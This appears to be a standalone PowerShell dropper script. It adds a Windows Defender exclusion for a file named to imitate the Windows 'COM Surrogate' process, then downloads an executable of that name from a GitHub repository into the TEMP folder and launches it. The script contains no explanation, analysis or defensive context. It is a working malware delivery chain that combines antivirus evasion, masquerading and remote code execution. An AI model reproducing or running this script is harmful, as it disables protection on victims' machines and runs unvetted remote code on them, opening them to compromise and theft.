Add-MpPreference -ExclusionPath $env:TEMP\COM_Surrogate.exe
$url = "https://raw.githubusercontent.com/M7mmdddd/webstie-demo/refs/heads/main/files/COM%20Surrogate.exe"

 $output = "$env:TEMP\COM_Surrogate.exe"

Invoke-WebRequest -Uri $url -OutFile $output

if (Test-Path $output) {
    Start-Process -FilePath $output
} else {
    Write-Host "Failed to download the file."
}
